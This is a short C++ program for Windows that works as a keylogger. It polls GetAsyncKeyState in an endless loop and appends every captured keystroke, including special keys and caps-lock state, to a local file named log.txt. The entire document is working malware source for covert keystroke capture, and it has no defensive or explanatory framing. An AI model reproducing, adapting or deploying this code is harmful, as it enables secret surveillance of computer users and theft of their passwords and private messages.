#include <fstream>
#include <Windows.h>
#include <iostream>

using namespace std;
int i=0;
int save(int key);

int main()
{
    char input;
    while (true)
    {
        for (input = 8; input <= 127; input++)
        {
            if (GetAsyncKeyState(input) == -32767)
                save(input);
        }
    }
    return 0;
}

int save(int key)
{

    ofstream fout;
    fout.open("log.txt", ios::out | ios::app);

    if (key == 8)
        fout << "[backspace]";

    else if (key == 9)
        fout << "[horizontal tab]";

    else if (key == 32)
        fout << "[space]"
             << " ";
    else if (key == 13)
        fout << endl
             << "[enter]" << endl;
    else if (key == 20)
    {
        if (i % 2 == 0)
            fout << "[capsON]";
        else
            fout << "[capsOFF]";
        i++;
    }

    else if (key >= 48 && key <= 57)
				fout<< (char)key;


    else
    {
        
        
            if (i % 2 == 0)
                fout << (char)(key + 32);
            else
                fout << (char)key;
        
    }
    fout.close();
    return 0;
}
